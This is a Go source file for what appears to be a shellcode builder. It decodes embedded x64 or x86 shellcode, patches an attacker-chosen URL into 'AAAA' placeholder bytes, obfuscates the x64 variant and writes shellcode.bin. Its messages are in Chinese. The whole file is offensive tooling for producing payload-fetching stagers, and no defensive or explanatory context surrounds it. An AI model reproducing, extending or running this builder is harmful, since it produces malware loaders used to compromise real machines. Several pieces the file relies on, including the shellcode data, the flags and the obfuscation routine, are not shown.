package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

func replaceUrl(bin, url string) []byte {
	shellcode, _ := base64.StdEncoding.DecodeString(bin)
	reader := bytes.NewReader(shellcode)
	arr := []byte(url)
	scanner := bufio.NewScanner(reader)
	for scanner.Scan() {
		if strings.Contains(scanner.Text(), "AAAA") {
			count := strings.Count(scanner.Text(), "AAAA")
			index := 0
			indexA := make([]int, count)
			for i := 0; i < count; i++ {
				index += strings.Index(scanner.Text()[index:], "AAAA")
				indexA[i] = index
				index += 4
			}
			if len(arr) < 48 {
				zero := 48 - len(arr)
				for m := 0; m < zero; m++ {
					arr = append(arr, 0)
				}
				for n := 0; n < count; n++ {
					shellcode[indexA[n]] = arr[n*4]
					shellcode[indexA[n]+1] = arr[n*4+1]
					shellcode[indexA[n]+2] = arr[n*4+2]
					shellcode[indexA[n]+3] = arr[n*4+3]
				}
				return shellcode
			} else {
				fmt.Println("[*] URL长度超过48字节限制，请减小URL长度！")
				os.Exit(0)
			}

		} else {
			fmt.Println("[-] Shellcode似乎出现问题了，去找作者吧！")
			os.Exit(0)
		}
	}
	return shellcode
}

func main() {
	Init()
	var sc []byte
	flag.Parse()
	switch {
	case *arch == "x64": // FMsW
		sc = obfuscate(replaceUrl(x64, *url))
	case *arch == "x86": // yn4A
		sc = replaceUrl(x86, *url)
	default:
		fmt.Println("[*] 请使用-h获取帮助信息")
		os.Exit(0)
	}

	fileName := "shellcode.bin"
	err := ioutil.WriteFile(fileName, sc, 0666)
	if err != nil {
		fmt.Println("[-] 生成Shellcode文件失败！")
	}
	fmt.Println("[+] Shellcode生成成功！")
}
